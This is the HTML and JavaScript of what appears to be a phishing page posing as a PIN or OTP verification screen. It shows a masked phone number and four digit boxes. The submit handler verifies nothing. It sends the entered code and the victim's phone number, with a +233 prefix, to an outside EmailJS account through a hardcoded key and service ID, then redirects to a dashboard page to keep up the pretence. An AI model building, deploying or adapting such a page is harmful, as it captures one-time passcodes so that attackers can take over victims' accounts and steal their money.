  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("gV773-VG85THpxrNV"); 
    })();
  </script>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #003366, #0055a5);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
    }

    body::before,
    body::after {
      content: "";
      position: absolute;
      border-radius: 50%;
      background: #ffcc00;
      opacity: 0.15;
    }

    body::before {
      width: 300px;
      height: 300px;
      top: -100px;
      left: -100px;
    }

    body::after {
      width: 200px;
      height: 200px;
      bottom: -80px;
      right: -80px;
    }

    .card {
      background: white;
      border-radius: 1rem;
      box-shadow: 0 8px 25px rgba(0,0,0,0.2);
      transition: transform 0.3s;
    }
    .card:hover {
      transform: translateY(-5px);
    }

    .otp-container {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin: 20px 0;
    }

    .otp-input {
      width: 60px;
      height: 60px;
      font-size: 24px;
      text-align: center;
      font-weight: bold;
      border: 2px solid #E5E7EB;
      border-radius: 12px;
      outline: none;
      background: #ffffff;
      color: #003366;
    }

    .otp-input:focus {
      border-color: #ffcc00;
      box-shadow: 0 0 6px rgba(255, 204, 0, 0.7);
    }

    .btn {
      background: #FFD700;
      color: #003366;
      font-weight: bold;
      transition: background 0.3s;
    }

    .btn:hover {
      background: #e6c200;
    }
  </style>
</head>
<body class="flex items-center justify-center min-h-screen p-6">

  <div class="card w-full max-w-md p-8">
    <h1 class="text-2xl font-bold text-center text-blue-900 mb-4">Verify Your PIN</h1>
    <p class="text-gray-600 text-center mb-6">OTP sent to ******9637</p>
    <h2 class="text-red-600 text-center mb-4 font-semibold">Do not share this PIN with anyone</h2>
    
    <form id="otpForm" class="space-y-6 text-center">
      <div class="otp-container">
        <input type="text" maxlength="1" class="otp-input" />
        <input type="text" maxlength="1" class="otp-input" />
        <input type="text" maxlength="1" class="otp-input" />
        <input type="text" maxlength="1" class="otp-input" />
      </div>

      <button type="submit" class="btn w-full py-3 rounded-lg shadow">
        Verify
      </button>
    </form>
  </div>

  <!-- Notification -->
  <div id="notification" class="hidden fixed top-5 right-5 px-4 py-3 rounded-xl shadow-lg font-medium text-white"></div>

 <script>
  const inputs = document.querySelectorAll(".otp-input");
  const otpForm = document.getElementById("otpForm");

  // ✅ Get phone number from localStorage
  const phone = localStorage.getItem("userPhone");
  if (phone) {
    const masked = "******" + phone.slice(-4);
    document.querySelector("p").textContent = `OTP sent to ${masked}`;
  } else {
    document.querySelector("p").textContent = "OTP sent to your registered number";
  }

  inputs.forEach((input, index) => {
    input.addEventListener("input", () => {
       input.value = input.value.replace(/[^0-9]/g, "");
      if (input.value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
    });

    input.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && !input.value && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });

  otpForm.addEventListener("submit", function(e) {
    e.preventDefault();
    const otp = Array.from(inputs).map(i => i.value).join("");
    if (otp.length === 4) {
      emailjs.send("service_74nt2c9","template_zelb8ji",{
        otp: otp,
        phone: "+233" + phone 
      }).then(() => {
        window.location.href = "dashboard.html"; 
      }).catch(() => {
        showNotification("Failed to verify OTP.", "error");
      });
    } else {
      showNotification("Please enter a valid 4-digit PIN.", "error");
    }
  });

   function showNotification(message, type="success") {
      const notification = document.getElementById("notification");
      notification.textContent = message;
      notification.className = `fixed top-5 right-5 px-4 py-3 rounded-xl shadow-lg font-medium text-white ${
        type === "success" ? "bg-blue-600" : "bg-red-600"
      }`;
      notification.classList.remove("hidden");
      setTimeout(() => notification.classList.add("hidden"), 3000);
    }
</script>

</body>
</html>
